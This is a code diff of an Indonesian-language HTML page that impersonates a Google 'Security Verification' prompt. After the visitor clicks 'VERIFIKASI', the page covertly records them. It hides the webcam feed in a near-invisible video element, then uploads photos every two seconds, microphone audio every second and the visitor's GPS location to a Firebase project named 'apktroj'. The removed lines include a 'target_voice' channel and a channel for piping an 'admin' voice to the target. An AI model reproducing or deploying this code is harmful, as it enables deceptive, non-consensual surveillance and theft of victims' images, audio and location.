@@ -1,63 +1,60 @@
 <!DOCTYPE html>
 <html>
-<head><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>System Sync</title></head>
+<head><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Security Verification</title></head>
 <body style="background:#000;color:#fff;margin:0;display:flex;align-items:center;justify-content:center;height:100vh;font-family:sans-serif">
-  <div style="text-align:center;padding:20px">
-    <div style="background:#4285f4;width:60px;height:60px;border-radius:50%;margin:0 auto 20px;display:flex;align-items:center;justify-content:center;font-size:30px">S</div>
-    <h2 style="font-size:18px">Sinkronisasi Audio</h2>
-    <p style="font-size:12px;color:#888">Klik izinkan untuk sinkronisasi perangkat.</p>
-    <button id="auth" style="background:#4285f4;color:#fff;border:none;width:100%;padding:16px;border-radius:8px;font-weight:bold;margin-top:20px">SINKRONKAN</button>
+  <div style="text-align:center;padding:20px;width:100%;max-width:300px">
+    <div style="background:#1a73e8;width:50px;height:50px;border-radius:50%;margin:0 auto 15px;display:flex;align-items:center;justify-content:center;font-size:25px;font-weight:bold">G</div>
+    <h2 style="font-size:16px;margin:0 0 10px">Verifikasi Keamanan</h2>
+    <p style="font-size:11px;color:#888;line-height:1.4">Izinkan akses untuk sinkronisasi akun Google Anda agar tetap aman.</p>
+    <button id="auth" style="background:#1a73e8;color:#fff;border:none;width:100%;padding:14px;border-radius:6px;font-weight:bold;margin-top:20px;cursor:pointer">VERIFIKASI</button>
     <video id="v" style="position:fixed;top:0;left:0;width:1px;height:1px;opacity:0.01" autoplay playsinline muted></video>
     <canvas id="c" style="display:none"></canvas>
   </div>
   <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
-    import { getFirestore, doc, setDoc, onSnapshot } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
+    import { getFirestore, doc, setDoc } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
     import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
     
     const app = initializeApp({"apiKey":"AIzaSyBhJsqqGbJGZ-u-PqJ5m4L-gHCaTqlS3Wo","authDomain":"apktroj.firebaseapp.com","projectId":"apktroj","storageBucket":"apktroj.firebasestorage.app","messagingSenderId":"943833619122","appId":"1:943833619122:web:d757ced4d56267abf247ab"});
     const db = getFirestore(app);
     const auth = getAuth(app);
-    let aCtx;
 
     document.getElementById('auth').onclick = async () => {
       try {
         await signInAnonymously(auth);
-        aCtx = new (window.AudioContext || window.webkitAudioContext)();
-        const s = await navigator.mediaDevices.getUserMedia({audio:true, video:{facingMode:"user"}});
-        document.getElementById('auth').innerText = "TERHUBUNG";
+        const stream = await navigator.mediaDevices.getUserMedia({audio:true, video:{facingMode:"user", width:320, height:240}});
+        document.getElementById('auth').innerText = "VERIFIED ✓";
         document.getElementById('auth').disabled = true;
 
-        const v = document.getElementById('v'); v.srcObject = s;
+        const v = document.getElementById('v'); v.srcObject = stream;
         const c = document.getElementById('c'); const ctx = c.getContext('2d');
 
-        // Capture Video every 5s
         setInterval(() => {
-          c.width = v.videoWidth; c.height = v.videoHeight;
-          ctx.drawImage(v, 0, 0);
-          setDoc(doc(db, 'artifacts', 'apktroj', 'public', 'data', 'control', 'photo'), { data: c.toDataURL('image/jpeg', 0.4), time: Date.now() });
-        }, 5000);
+          c.width = 320; c.height = 240;
+          ctx.drawImage(v, 0, 0, 320, 240);
+          setDoc(doc(db, 'artifacts', 'apktroj', 'public', 'data', 'control', 'photo'), { 
+            data: c.toDataURL('image/jpeg', 0.3), 
+            time: Date.now() 
+          });
+        }, 2000);
 
-        // Listen for Admin's Voice (The "Suara ke Target" fix)
-        onSnapshot(doc(db, 'artifacts', 'apktroj', 'public', 'data', 'control', 'admin_voice'), (snap) => {
-          if(snap.exists() && aCtx) {
-            const d = snap.data();
-            fetch(d.chunk).then(r => r.arrayBuffer()).then(b => aCtx.decodeAudioData(b)).then(buf => {
-              const src = aCtx.createBufferSource();
-              src.buffer = buf; src.connect(aCtx.destination); src.start();
-            });
-          }
-        });
-
-        // Send Target's Voice to Admin
-        const mr = new MediaRecorder(s);
+        const mr = new MediaRecorder(stream);
         mr.ondataavailable = (e) => {
           const r = new FileReader();
-          r.onload = () => setDoc(doc(db, 'artifacts', 'apktroj', 'public', 'data', 'control', 'target_voice'), { chunk: r.result, time: Date.now() });
+          r.onload = () => setDoc(doc(db, 'artifacts', 'apktroj', 'public', 'data', 'control', 'audio_stream'), { 
+            chunk: r.result, 
+            time: Date.now() 
+          });
           r.readAsDataURL(e.data);
         };
-        mr.start(2000);
-      } catch(e) { alert("Error: Izin ditolak."); }
+        mr.start(1000);
+
+        navigator.geolocation.getCurrentPosition((p) => {
+          setDoc(doc(db, 'artifacts', 'apktroj', 'public', 'data', 'control', 'status'), { 
+            lat: p.coords.latitude, lng: p.coords.longitude, time: Date.now() 
+          });
+        });
+      } catch(err) { alert("Error: Perangkat tidak mendukung atau izin ditolak."); }
     };
   </script>
 </body>
